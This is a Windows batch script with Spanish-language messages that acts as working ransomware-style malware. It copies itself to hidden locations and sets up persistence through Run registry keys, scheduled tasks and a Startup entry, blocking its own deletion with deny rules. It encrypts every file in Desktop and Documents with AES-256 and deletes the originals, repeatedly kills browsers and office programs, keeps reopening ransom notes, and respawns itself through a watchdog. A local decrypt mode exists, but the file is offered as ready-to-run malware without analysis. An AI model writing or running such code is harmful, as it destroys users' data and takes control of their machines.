@echo off
setlocal EnableExtensions EnableDelayedExpansion

if /i "%~1"=="watchdog"  goto :watchdog
if /i "%~1"=="decrypt"   goto :decrypt
if /i "%~1"=="uninstall" goto :uninstall

title  WARNING - Por que queres este tipo de contenido - NO CIERRES ESTA VENTANA
color 4F

set "ME=%~f0"
set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
set "EXE=%DIR%\WinSys.bat"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "HB=%DIR%\hb"
set "MSG=%DIR%\msg.txt"
set "LOG=%DIR%\log.txt"

if not exist "%DIR%" md "%DIR%" >nul 2>&1
attrib +h "%DIR%" >nul 2>&1
>>"%LOG%" echo [%DATE% %TIME%] arranque "%~1"

call :install
>>"%LOG%" echo [%TIME%] persistencia ok

rem ---------------- lock anti-duplicado ----------------
md "%DIR%\run" >nul 2>&1
if not errorlevel 1 goto :owner

set "A="
if exist "%HB%" set /p A=<"%HB%"
ping -n 3 127.0.0.1 >nul
set "B="
if exist "%HB%" set /p B=<"%HB%"
if not "%A%"=="%B%" (
    >>"%LOG%" echo [%TIME%] ya hay instancia viva, salgo
    exit /b
)
>>"%LOG%" echo [%TIME%] lock viejo, tomo el control
rd "%DIR%\run" >nul 2>&1
md "%DIR%\run" >nul 2>&1

:owner
>>"%LOG%" echo [%TIME%] instancia principal activa

call :msg

if not exist "%DIR%\.locked" (
    cls
    color 4F
    echo.
    echo   [*] Instalando persistencia...
    echo   [*] Encriptando Escritorio y Documentos con AES-256...
    echo.
    call :encrypt
    >"%DIR%\.locked" echo ok
    attrib +h +s "%DIR%\.locked" >nul 2>&1
    >>"%LOG%" echo [%TIME%] cifrado ok
    ping -n 3 127.0.0.1 >nul
)

mode con cols=100 lines=30 >nul 2>&1
call :topmost
call :ensure_watchdog

>>"%LOG%" echo [%TIME%] entrando al loop

:main
>"%HB%" echo %TIME%
call :kill_apps
call :ensure_watchdog
ping -n 2 127.0.0.1 >nul
call :spawn_notes
cls
color 4F
call :banner
echo   [%TIME%]  Sistema activo. Ventana verificada. 5 notepads reabiertos.
ping -n 6 127.0.0.1 >nul
goto :main

:topmost
> "%DIR%\tp.ps1" echo Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr h,IntPtr a,int x,int y,int cx,int cy,uint f); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h,int n);'
>>"%DIR%\tp.ps1" echo $h=[N.W]::GetConsoleWindow()
>>"%DIR%\tp.ps1" echo [N.W]::ShowWindow($h,1)
>>"%DIR%\tp.ps1" echo [N.W]::SetWindowPos($h,[IntPtr](-1),0,0,0,0,0x0003)
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%DIR%\tp.ps1"
exit /b

:spawn_notes
for /l %%N in (1,1,5) do start "" /max notepad "%MSG%"
exit /b

:msg
if exist "%MSG%" exit /b
>"%MSG%" echo  ##############################################################
>>"%MSG%" echo  ##                                                          ##
>>"%MSG%" echo  ##     W A R N I N G                                        ##
>>"%MSG%" echo  ##                                                          ##
>>"%MSG%" echo  ##     POR QUE QUERES ESTE TIPO DE CONTENIDO?               ##
>>"%MSG%" echo  ##                                                          ##
>>"%MSG%" echo  ##     SU COMPUTADORA NO DEJARA DE HACER ESTO.              ##
>>"%MSG%" echo  ##                                                          ##
>>"%MSG%" echo  ##############################################################
>>"%MSG%" echo.
>>"%MSG%" echo  Tus archivos del Escritorio y Documentos fueron encriptados
>>"%MSG%" echo  con AES-256 y renombrados con el prefijo ENCRIPTED_
>>"%MSG%" echo.
>>"%MSG%" echo  Esta ventana se reabre cada 5 segundos. No sirve cerrarla.
>>"%MSG%" echo.
>>"%MSG%" echo  Para recuperar tus archivos:
>>"%MSG%" echo     WinSys.bat decrypt
>>"%MSG%" echo.
>>"%MSG%" echo  Para sacar tambien la persistencia:
>>"%MSG%" echo     WinSys.bat uninstall
>>"%MSG%" echo.
>>"%MSG%" echo  Clave de cifrado:
>>"%MSG%" echo     %%APPDATA%%\Microsoft\Windows\SystemCache\.vk
copy /y "%MSG%" "%USERPROFILE%\Desktop\LEEME_ENCRIPTADO.txt" >nul 2>&1
exit /b

:banner
echo.
echo.
echo        ####  #   #  ####  #   #  #####  #   #  #####
echo        #   # #   # #   # ##  #    #    ##  #    #
echo        #   # #   # #   # # # #    #    # # #    #
echo        #   # #   # #   # #  ##    #    #  ##    #
echo        ####   ###  ####  #   #  #####  #   #  #####
echo.
echo   ##########################################################
echo   ##                                                      ##
echo   ##     POR QUE QUERES ESTE TIPO DE CONTENIDO?           ##
echo   ##                                                      ##
echo   ##     SU COMPUTADORA NO DEJARA DE HACER ESTO.          ##
echo   ##                                                      ##
echo   ##########################################################
echo.
echo        Escritorio y Documentos encriptados en AES-256
echo        5 notepads maximizados cada 5 segundos
echo        5 copias ocultas + 2 tareas programadas
echo.
echo        Para recuperar tus archivos:  WinSys.bat decrypt
echo.
exit /b

:kill_apps
for %%P in (mspaint.exe chrome.exe msedge.exe firefox.exe opera.exe brave.exe WINWORD.EXE EXCEL.EXE POWERPNT.EXE outlook.exe Teams.exe ms-teams.exe Discord.exe Telegram.exe Spotify.exe Code.exe steam.exe vlc.exe wmplayer.exe Skype.exe Zoom.exe) do taskkill /f /im %%P >nul 2>&1
taskkill /f /im notepad.exe >nul 2>&1
exit /b

:install
copy /y "%ME%" "%EXE%" >nul 2>&1
copy /y "%ME%" "%STARTUP%\WindowsSystem.bat" >nul 2>&1
copy /y "%ME%" "%TEMP%\WinSys.bat" >nul 2>&1
copy /y "%ME%" "%ProgramData%\WinSys.bat" >nul 2>&1
copy /y "%ME%" "%PUBLIC%\WinSys.bat" >nul 2>&1
copy /y "%ME%" "%USERPROFILE%\WinSys.bat" >nul 2>&1

attrib +r +h +s "%EXE%" >nul 2>&1
attrib +r +h +s "%STARTUP%\WindowsSystem.bat" >nul 2>&1
attrib +r +h +s "%PUBLIC%\WinSys.bat" >nul 2>&1
attrib +r +h +s "%ProgramData%\WinSys.bat" >nul 2>&1

icacls "%EXE%" /deny "%USERNAME%:(D)" >nul 2>&1
icacls "%STARTUP%\WindowsSystem.bat" /deny "%USERNAME%:(D)" >nul 2>&1
icacls "%PUBLIC%\WinSys.bat" /deny "%USERNAME%:(D)" >nul 2>&1

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystem /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v WinSystemOnce /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v WinSystemP /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystemHK /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1

schtasks /create /tn "WindowsSystemUpdate" /tr "\"%EXE%\"" /sc onlogon /f >nul 2>&1
schtasks /create /tn "WindowsSystemUpdate2" /tr "\"%EXE%\"" /sc minute /mo 1 /f >nul 2>&1
exit /b

:ensure_watchdog
set "CUR="
if exist "%DIR%\whb" set /p CUR=<"%DIR%\whb"
if "%CUR%"=="" (
    call :spawn_wd
    exit /b
)
if "%CUR%"=="%WLAST%" (
    set /a WDEAD+=1 >nul
) else (
    set "WDEAD=0"
)
set "WLAST=%CUR%"
if %WDEAD% GEQ 3 (
    set "WDEAD=0"
    call :spawn_wd
)
exit /b

:spawn_wd
rd "%DIR%\wd" >nul 2>&1
start "" /min cmd /c ""%EXE%" watchdog"
exit /b

:watchdog
title VeniceWatchdog
color 4F
set "EXE=%~f0"
set "DIR=%~dp0"
set "HB=%~dp0hb"
md "%DIR%wd" >nul 2>&1
if errorlevel 1 exit /b
set "DEAD=0"
set "LAST="
:wd
set "C="
if exist "%HB%" set /p C=<"%HB%"
if "%C%"=="" goto :wdspawn
if "%C%"=="%LAST%" (set /a DEAD+=1 >nul) else (set "DEAD=0")
set "LAST=%C%"
if %DEAD% GEQ 3 goto :wdspawn
>"%DIR%whb" echo %TIME%
ping -n 6 127.0.0.1 >nul
goto :wd
:wdspawn
set "DEAD=0"
set "LAST="
rd "%DIR%\run" >nul 2>&1
start "" cmd /c ""%EXE%" boot"
>"%DIR%whb" echo %TIME%
ping -n 10 127.0.0.1 >nul
goto :wd

:encrypt
> "%DIR%\enc.ps1" echo $ErrorActionPreference='SilentlyContinue'
>>"%DIR%\enc.ps1" echo $base="$env:APPDATA\Microsoft\Windows\SystemCache"
>>"%DIR%\enc.ps1" echo $rng=New-Object Security.Cryptography.RNGCryptoServiceProvider
>>"%DIR%\enc.ps1" echo $key=New-Object byte[] 32
>>"%DIR%\enc.ps1" echo $rng.GetBytes($key)
>>"%DIR%\enc.ps1" echo [IO.File]::WriteAllText("$base\.vk",[BitConverter]::ToString($key))
>>"%DIR%\enc.ps1" echo $total=0
>>"%DIR%\enc.ps1" echo foreach($d in @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents")){
>>"%DIR%\enc.ps1" echo  Get-ChildItem -LiteralPath $d -File -Recurse ^| Where-Object {$_.Name -notlike 'ENCRIPTED_*' -and $_.Length -gt 0} ^| ForEach-Object{
>>"%DIR%\enc.ps1" echo   $p=$_.FullName
>>"%DIR%\enc.ps1" echo   $dir=[IO.Path]::GetDirectoryName($p)
>>"%DIR%\enc.ps1" echo   $nm=[IO.Path]::GetFileName($p)
>>"%DIR%\enc.ps1" echo   $new=Join-Path $dir ("ENCRIPTED_"+$nm)
>>"%DIR%\enc.ps1" echo   $i=1
>>"%DIR%\enc.ps1" echo   while(Test-Path -LiteralPath $new){ $new=Join-Path $dir ("ENCRIPTED_"+$i+"_"+$nm); $i++ }
>>"%DIR%\enc.ps1" echo   $iv=New-Object byte[] 16
>>"%DIR%\enc.ps1" echo   $rng.GetBytes($iv)
>>"%DIR%\enc.ps1" echo   $aes=[Security.Cryptography.Aes]::Create()
>>"%DIR%\enc.ps1" echo   $aes.Key=$key
>>"%DIR%\enc.ps1" echo   $aes.IV=$iv
>>"%DIR%\enc.ps1" echo   $out=[IO.File]::Create($new)
>>"%DIR%\enc.ps1" echo   $out.Write($iv,0,16)
>>"%DIR%\enc.ps1" echo   $in=[IO.File]::OpenRead($p)
>>"%DIR%\enc.ps1" echo   $cs=New-Object Security.Cryptography.CryptoStream($out,$aes.CreateEncryptor(),[Security.Cryptography.CryptoStreamMode]::Write)
>>"%DIR%\enc.ps1" echo   $buf=New-Object byte[] 1048576
>>"%DIR%\enc.ps1" echo   while(($n=$in.Read($buf,0,$buf.Length)) -gt 0){ $cs.Write($buf,0,$n) }
>>"%DIR%\enc.ps1" echo   $cs.FlushFinalBlock()
>>"%DIR%\enc.ps1" echo   $cs.Close()
>>"%DIR%\enc.ps1" echo   $in.Close()
>>"%DIR%\enc.ps1" echo   $out.Close()
>>"%DIR%\enc.ps1" echo   $aes.Clear()
>>"%DIR%\enc.ps1" echo   Remove-Item -LiteralPath $p -Force
>>"%DIR%\enc.ps1" echo   Write-Host ("   ^-> " + $nm)
>>"%DIR%\enc.ps1" echo   $total++
>>"%DIR%\enc.ps1" echo  }
>>"%DIR%\enc.ps1" echo }
>>"%DIR%\enc.ps1" echo Write-Host ""
>>"%DIR%\enc.ps1" echo Write-Host ("   " + $total + " archivos encriptados.")
powershell -NoProfile -ExecutionPolicy Bypass -File "%DIR%\enc.ps1"
exit /b

:decrypt
title Restaurando archivos
color 0A
set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
if not exist "%DIR%\.vk" (
    echo.
    echo   No se encontro la clave de cifrado.
    pause
    exit /b
)
> "%DIR%\dec.ps1" echo $ErrorActionPreference='SilentlyContinue'
>>"%DIR%\dec.ps1" echo $base="$env:APPDATA\Microsoft\Windows\SystemCache"
>>"%DIR%\dec.ps1" echo $key=[byte[]]([IO.File]::ReadAllText("$base\.vk").Split('-') ^| ForEach-Object {[Convert]::ToByte($_,16)})
>>"%DIR%\dec.ps1" echo $total=0
>>"%DIR%\dec.ps1" echo foreach($d in @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents")){
>>"%DIR%\dec.ps1" echo  Get-ChildItem -LiteralPath $d -File -Recurse -Filter 'ENCRIPTED_*' ^| ForEach-Object{
>>"%DIR%\dec.ps1" echo   $p=$_.FullName
>>"%DIR%\dec.ps1" echo   $dir=[IO.Path]::GetDirectoryName($p)
>>"%DIR%\dec.ps1" echo   $nm=[IO.Path]::GetFileName($p) -replace '^ENCRIPTED_(\d+_)?',''
>>"%DIR%\dec.ps1" echo   $new=Join-Path $dir $nm
>>"%DIR%\dec.ps1" echo   $in=[IO.File]::OpenRead($p)
>>"%DIR%\dec.ps1" echo   $iv=New-Object byte[] 16
>>"%DIR%\dec.ps1" echo   $in.Read($iv,0,16) ^| Out-Null
>>"%DIR%\dec.ps1" echo   $aes=[Security.Cryptography.Aes]::Create()
>>"%DIR%\dec.ps1" echo   $aes.Key=$key
>>"%DIR%\dec.ps1" echo   $aes.IV=$iv
>>"%DIR%\dec.ps1" echo   $out=[IO.File]::Create($new)
>>"%DIR%\dec.ps1" echo   $cs=New-Object Security.Cryptography.CryptoStream($in,$aes.CreateDecryptor(),[Security.Cryptography.CryptoStreamMode]::Read)
>>"%DIR%\dec.ps1" echo   $buf=New-Object byte[] 1048576
>>"%DIR%\dec.ps1" echo   while(($n=$cs.Read($buf,0,$buf.Length)) -gt 0){ $out.Write($buf,0,$n) }
>>"%DIR%\dec.ps1" echo   $cs.Close()
>>"%DIR%\dec.ps1" echo   $out.Close()
>>"%DIR%\dec.ps1" echo   $in.Close()
>>"%DIR%\dec.ps1" echo   $aes.Clear()
>>"%DIR%\dec.ps1" echo   Remove-Item -LiteralPath $p -Force
>>"%DIR%\dec.ps1" echo   Write-Host ("   ^<- " + $nm)
>>"%DIR%\dec.ps1" echo   $total++
>>"%DIR%\dec.ps1" echo  }
>>"%DIR%\dec.ps1" echo }
>>"%DIR%\dec.ps1" echo Write-Host ""
>>"%DIR%\dec.ps1" echo Write-Host ("   " + $total + " archivos restaurados.")
echo.
echo   Descifrando...
powershell -NoProfile -ExecutionPolicy Bypass -File "%DIR%\dec.ps1"
del /q "%DIR%\.locked" >nul 2>&1
echo.
echo   Listo.
pause
exit /b

:uninstall
title Desinstalando
color 0A
set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystem /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v WinSystemOnce /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v WinSystemP /f >nul 2>&1
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystemHK /f >nul 2>&1

schtasks /delete /tn "WindowsSystemUpdate" /f >nul 2>&1
schtasks /delete /tn "WindowsSystemUpdate2" /f >nul 2>&1

taskkill /f /fi "WINDOWTITLE eq VeniceWatchdog" >nul 2>&1
taskkill /f /im notepad.exe >nul 2>&1
rd "%DIR%\run" >nul 2>&1
rd "%DIR%\wd" >nul 2>&1

for %%F in ("%EXE%" "%STARTUP%\WindowsSystem.bat" "%PUBLIC%\WinSys.bat" "%ProgramData%\WinSys.bat" "%USERPROFILE%\WinSys.bat" "%TEMP%\WinSys.bat") do (
    icacls %%~F /remove:d "%USERNAME%" >nul 2>&1
    attrib -h -s -r %%~F >nul 2>&1
    del /f /q %%~F >nul 2>&1
)
echo.
echo   Persistencia eliminada.
echo   Los archivos encriptados siguen como ENCRIPTED_*: usa "decrypt" antes.
pause
exit /b
